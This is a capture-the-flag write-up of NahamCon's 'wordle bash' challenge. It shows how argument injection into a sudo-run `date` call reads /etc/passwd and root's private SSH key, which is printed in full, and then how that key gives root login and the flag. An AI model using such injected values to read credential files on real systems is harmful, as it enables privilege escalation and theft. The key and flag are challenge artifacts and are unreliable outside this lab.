>Author: @JohnHammond#6971  
>  
>We put a new novel spin on the old classic game of Wordle! Now it's written in bash! :D  
>  
>Oh, and you aren't guessing words, this time...
--------------------------
Upon ssh, we find the wordle challenge. It's umpiled shell code, so firstly let's take a look:
```bash
#!/bin/bash

YEARS=("2020" "2021" "2022" "2023" "2024" "2025")
MONTHS=("01" "02" "03" "04" "05" "06" "07" "08" "09" "10" "11" "12" )
DAYS=("01" "02" "03" "04" "05" "06" "07" "08" "09" "10" "11" "12" "13" "14" "15" "16" "17" "18" "19" "20" "21" "22" "23" "24" "25" "26" "27" "28" "29" "30" "31")

YEARS_SIZE=${#YEARS[@]}
YEARS_INDEX=$(($RANDOM % $YEARS_SIZE))
YEAR=${YEARS[$YEARS_INDEX]}

MONTHS_SIZE=${#MONTHS[@]}
MONTHS_INDEX=$(($RANDOM % $MONTHS_SIZE))
MONTH=${MONTHS[$MONTHS_INDEX]}

DAYS_SIZE=${#DAYS[@]}
DAYS_INDEX=$(($RANDOM % $DAYS_SIZE))
DAY=${DAYS[$DAYS_INDEX]}

TARGET_DATE="${YEAR}-${MONTH}-${DAY}"

gum style \
  --foreground 212 --border-foreground 212 --border double \
  --align center --width 50 --margin "1 2" --padding "2 4" \
  'WORDLE DATE' 'Uncover the correct date!'

echo "We've selected a random date, and it's up to you to guess it!"

wordle_attempts=1
while [ $wordle_attempts -le 5 ]
do
  echo "Attempt $wordle_attempts:"
  echo "Please select the year you think we've chosen:"
  chosen_year=$(gum choose ${YEARS[@]})

  echo "Now, enter the month of your guess: "
  chosen_month=$(gum choose ${MONTHS[@]})

  echo "Finally, enter the day of your guess: "
  chosen_day=$(gum choose ${DAYS[@]})
  
  guess_date="$chosen_year-$chosen_month-$chosen_day"
  
  if ! date -d $guess_date; then
    echo "Invalid date! Your guess must be a valid date in the format YYYY-MM-DD."
    exit
  fi

  confirmed=1
  while [ $confirmed -ne 0 ]
  do
    gum confirm "You've entered '$guess_date'. Is that right?"
    confirmed=$?
    if [[ $confirmed -eq 0 ]]
    then
      break
    fi
    echo "Please select the date you meant:"
    guess_date=$(gum input --placeholder $guess_date)
  done

  if [[ $(date $guess_date) == $(date -d $TARGET_DATE +%Y-%m-%d) ]]; then
    gum style \
      --foreground 212 --border-foreground 212 --border double \
      --align center --width 50 --margin "1 2" --padding "2 4" \
      "Congratulations, you've won! You correctly guessed the date!" 'Your flag is:' $(cat /root/flag.txt)
    exit 0
  else
    echo "Sorry, that wasn't correct!"
    echo "====================================="
  fi

  wordle_attempts=$((wordle_attempts+1))
done

gum style \
  --foreground 212 --border-foreground 212 --border double \
  --align center --width 50 --margin "1 2" --padding "2 4" \
  "Sorry, you lost." "The correct date was $TARGET_DATE."

```

We can see the dates are generated "randomly" upon launch, so my first thought is to run 2 instances simultaneously. If the dates can match up, then it will be an easy win:
```bash
user@wordle:~$ ./wordle_bash.sh & ./wordle_bash.sh








```

It works as expected, but I hadn't considered that in order to see the flag it had to be run as sudo. A quick check on sudo privs shows me that I am indeed capable:
```bash
user@wordle:~$ sudo -l
<... SNIP ...>
User user may run the following commands on wordle-bash-d18d8fe5e302e98a-89966b69d-lv5gw:
    (root) /home/user/wordle_bash.sh
```

However, running 2 sudo instances became very problematic, as I am asked for password on every launch. If one sudo process is immediately sent to `bg`, it will fail to launch once i try to `fg`, since the password had not really been submitted.

After spending too long on trying to run 2 processes simultaneously, I looked more thoroughly at the userinput we could control. I noticed that after selecting dates, you are asked confirmation. If you say no, you can supply your own input with interesting results:
```bash
Please select the date you meant:
                                                          
You've entered '-d $TARGET_DATE +%Y-%m-%d'. Is that right?
date: invalid date ‘$TARGET_DATE’
Sorry, that wasn't correct!
```

The `date` function seems to be recognizing the -d flag without issue? Perhaps we are able to provide our own arguments to execute.

The [GTFObins](https://gtfobins.github.io/gtfobins/date/) site has a page for `date`; we might be able to utilize arbitrary read capabilities.
```bash
Please select the date you meant:
                                               
You've entered '-f /etc/passwd'. Is that right?
date: invalid date ‘root:x:0:0:root:/root:/bin/bash’
date: invalid date ‘bin:x:1:1:bin:/bin:/sbin/nologin’
date: invalid date ‘daemon:x:2:2:daemon:/sbin:/sbin/nologin’
date: invalid date ‘adm:x:3:4:adm:/var/adm:/sbin/nologin’
date: invalid date ‘lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin’
date: invalid date ‘sync:x:5:0:sync:/sbin:/bin/sync’
date: invalid date ‘shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown’
date: invalid date ‘halt:x:7:0:halt:/sbin:/sbin/halt’
date: invalid date ‘mail:x:8:12:mail:/var/mail:/sbin/nologin’
date: invalid date ‘news:x:9:13:news:/usr/lib/news:/sbin/nologin’
date: invalid date ‘uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin’
date: invalid date ‘operator:x:11:0:operator:/root:/sbin/nologin’
date: invalid date ‘man:x:13:15:man:/usr/man:/sbin/nologin’
date: invalid date ‘postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin’
date: invalid date ‘cron:x:16:16:cron:/var/spool/cron:/sbin/nologin’
date: invalid date ‘ftp:x:21:21::/var/lib/ftp:/sbin/nologin’
date: invalid date ‘sshd:x:22:22:sshd:/dev/null:/sbin/nologin’
date: invalid date ‘at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin’
date: invalid date ‘squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin’
date: invalid date ‘xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin’
date: invalid date ‘games:x:35:35:games:/usr/games:/sbin/nologin’
date: invalid date ‘cyrus:x:85:12::/usr/cyrus:/sbin/nologin’
date: invalid date ‘vpopmail:x:89:89::/var/vpopmail:/sbin/nologin’
date: invalid date ‘ntp:x:123:123:NTP:/var/empty:/sbin/nologin’
date: invalid date ‘smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin’
date: invalid date ‘guest:x:405:100:guest:/dev/null:/sbin/nologin’
date: invalid date ‘nobody:x:65534:65534:nobody:/:/sbin/nologin’
date: invalid date ‘user:x:1000:1000:Linux User,,,:/home/user:/home/user/.user-entrypoint.sh’
Sorry, that wasn't correct!
```
With arbitrary read, we should be able to display the contents of the flag.txt as well!
```bash
Please select the date you meant:
                                                  
You've entered '-f /root/flag.txt'. Is that right?
date: invalid date ‘[ Sorry, your flag will be displayed once you have code execution as root ]’
Sorry, that wasn't correct!
```
Unexpectedly, it looks like flag.txt was a bait after all. It says we must have code execution as root for the flag, but I thought perhaps I can "guess" the name of the flag file using wildcards:
```bash
Please select the date you meant:
                                           
You've entered '-f /root/*'. Is that right?
date: the argument ‘/root/get_flag_random_suffix_345674837560870345’ lacks a leading '+';
when using an option to specify date(s), any non-option
argument must be a format string beginning with '+'
Try 'date --help' for more information.
Sorry, that wasn't correct!
```
We find an interesting file name. Once more, using exactly this name:
```
Wed Jan  1 00:00:00 UTC 2020
Please select the date you meant:
                                                                                   
You've entered '-f /root/get_flag_random_suffix_345674837560870345'. Is that right?
date: invalid date ‘\177ELF\002\001\001’
date: invalid date ‘:’
date: invalid date ‘.\001?\031\003\016:\v;\v9\vI\023<\031\001\023’
Sorry, that wasn't correct!
```
This is a binary executable, likely containing our flag once we execute as root. So, clearly, we do indeed need code execution as root.

Eventually, I thought to look for ssh keys in `/root/.ssh/id_rsa`:
```bash
date: invalid date ‘-----BEGIN OPENSSH PRIVATE KEY-----’
date: invalid date ‘b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn’
date: invalid date ‘NhAAAAAwEAAQAAAYEAxllMaPu/ewDglK/+qcskWbUTSiQtLBBX4Ls5EGWmGbTdKh7K7trC’
date: invalid date ‘Nht9hbSx8Ei4cLQWhbbwcvIqDAgrXYO9Vb/sr/BEyk1aVVTpFfLuFbsyZNZTqmONajdsf9’
date: invalid date ‘Kl/4Qy9u8/3duhBYaeV0Am4tK9mzM8/D2YbzmYD+pK8GFwJDQG5RdFstj6NxXjROAsaj8H’
date: invalid date ‘U7HHvkNFctEMMBmquAaG85DZO83ZUWWASB702UNrc701Mhdf7Ln92D2aEhwMisdBjK/F83’
date: invalid date ‘K71YIcrpkuDTQYhms4SGUlYIlUaIhridKH3m3BgCNhC5mjsy5IkV0VwG/SRxew0adhHxT+’
date: invalid date ‘Gc9izi2yy1uW1wrJT0u8ImQhTm35R+cLD+SpWJSHswDxygCVHTUvVIngNakJvWXRKDmS3N’
date: invalid date ‘PjIu9gaJ3D69Q3BDlxcbluhjl2Z/5nenryUZdoVORnCf75YiWgTtI/FhS7HnHyw69LaJoH’
date: invalid date ‘1NPGh/mV730OsnqtdakxkHXd3CDhcwY5QjvJlFEdAAAFgAlNDvEJTQ7xAAAAB3NzaC1yc2’
date: invalid date ‘EAAAGBAMZZTGj7v3sA4JSv/qnLJFm1E0okLSwQV+C7ORBlphm03Soeyu7awjYbfYW0sfBI’
date: invalid date ‘uHC0FoW28HLyKgwIK12DvVW/7K/wRMpNWlVU6RXy7hW7MmTWU6pjjWo3bH/Spf+EMvbvP9’
date: invalid date ‘3boQWGnldAJuLSvZszPPw9mG85mA/qSvBhcCQ0BuUXRbLY+jcV40TgLGo/B1Oxx75DRXLR’
date: invalid date ‘DDAZqrgGhvOQ2TvN2VFlgEge9NlDa3O9NTIXX+y5/dg9mhIcDIrHQYyvxfNyu9WCHK6ZLg’
date: invalid date ‘00GIZrOEhlJWCJVGiIa4nSh95twYAjYQuZo7MuSJFdFcBv0kcXsNGnYR8U/hnPYs4tsstb’
date: invalid date ‘ltcKyU9LvCJkIU5t+UfnCw/kqViUh7MA8coAlR01L1SJ4DWpCb1l0Sg5ktzT4yLvYGidw+’
date: invalid date ‘vUNwQ5cXG5boY5dmf+Z3p68lGXaFTkZwn++WIloE7SPxYUux5x8sOvS2iaB9TTxof5le99’
date: invalid date ‘DrJ6rXWpMZB13dwg4XMGOUI7yZRRHQAAAAMBAAEAAAGAECAzdPeUCOaN264hU2Gcz3RIIL’
date: invalid date ‘InQAVbd6hmX8hmhCwvAkfQR4dehx1ItmWgmoChtNFXYWtO9NwZAghp/3zV7aegZmoaKvkL’
date: invalid date ‘UT5e2DYmGCXeLNI7VBzVjZ9QQWYkBng+LShPYMoEjIP2J0bObTN6pH26cBF77VMD42Cw01’
date: invalid date ‘vrTO4z6ffbO/VQW8kk7zUV4f9vfjpJGyqx9enmsURs8PA1lDjLCIXYV2Sb/4EQzAHOCxyv’
date: invalid date ‘Zfv+LwCsvCIUqXNBVnO+N7hg5b/zh7gyvuzHq/vyOTjkNceQa7SZ/egeclWGkkYttUzUr1’
date: invalid date ‘0cveVqXTM2tfJhv8+cobJcmO7IccjsOyL+zYPR3mN/Q1nUvGyAERppXfhwTAZ5ljMRDkv/’
date: invalid date ‘KUy7IJ3Q9FnSVdqkni2u6ErHEer0/TKXAT92LYQXzTczd6hGvh+IADlmOLzU2d0RfkPZZ4’
date: invalid date ‘8GKvZfThN1OSMVpcwJMVeILWP6uz9WnnUAXgLIUriJK7rrsHpH0MNTmfTT9v5VSH3RAAAA’
date: invalid date ‘wB2od8rr4IU8AkpZ/kE9kY5a/INNsvSdUA6sn/5Fwso19fiPz2vYdP9fJMYjShV1wb8UFt’
date: invalid date ‘cajFvnnj2DnClU0imh1eC0fB5+vAmJvx8Qq9NWcmz7aejvZrBdIFbqGYr5krc5KvmizYVC’
date: invalid date ‘+tII4u4s5SFcvcZwmuIsWJQjbXA7VVa8v8Y10YJdeYsl3YpKqJdU0xPkt2Y2IgZxTJ4Dd9’
date: invalid date ‘MKgcPTBdOVuKA8r8ALCth9OV74k1GOEpLbDIY4gFiXbi7crQAAAMEA2Z0ZtNS6bUEq61DF’
date: invalid date ‘6758uI3wIeYe8NoGyxlH/oTGVqy5KfQ9vCochcSx0yov4MSZBY+foE8OAxNvAxBSV+2CnQ’
date: invalid date ‘4OHnZnKa9teSvphUCmnt4Va7CWRzmVmNiKlpMOky2P8Zfv3LdgpwrAbwxBL1HQv/eivXDm’
date: invalid date ‘0BQCxuiaOp5/3nz+K+IvA/cBhsJwS6bWMtAhcfzKfS7/NzgcLTtlVR1Li/vC/r69iDs/xi’
date: invalid date ‘zDGCjuOrjsWhqqIqjhMGZjguTz9Y+FAAAAwQDpVj6g1OSqzZ5Kw805VTcbRRTmiHb00hht’
date: invalid date ‘U4LYw5xV+1iNJ8/BijiIZaT/zXnZbzIzLBnPbzqNLW5sBPJ+eMo5wY5ZNKa/qMd4Rdj6Hx’
date: invalid date ‘pAVbuqv6sYPhj2Xl6R/yJUVRw6OGoIa0SEumrmXzbJTT25o9FgItuKOpRRWd9l4gB8Pa1I’
date: invalid date ‘LLomZzqAmpdZtcMX+ihYPAJL5UBGPkD4CO7JwHm+W36NpAEKhi/Fh6D/U/RPEtwXZEbaWY’
date: invalid date ‘vIJis7FbO7UrkAAAAJa2FsaUBrYWxpAQI=’
date: invalid date ‘-----END OPENSSH PRIVATE KEY-----’
Sorry, that wasn't correct!
```

Very nicely, the whole key is here. from this point it's a matter of creating the cleaned id_rsa file and using it to ssh as root.
```bash
$ ssh -p 32726 -i id_rsa root@challenge.nahamcon.com

root@wordle:~# cd /root
root@wordle:~# ls
flag.txt  get_flag_random_suffix_345674837560870345
root@wordle:~# ./get_flag_random_suffix_345674837560870345 
Please press Enter within one second to retrieve the flag.

flag{2b9576d1a7a631b8ce12595f80f3aba5}
```
There is even the extra precaution of needing to press Enter after running in order to retrieve the password. They were quite thorough in wanting you to have execution as root.

`flag{2b9576d1a7a631b8ce12595f80f3aba5}`

- Author : LazyTitan33
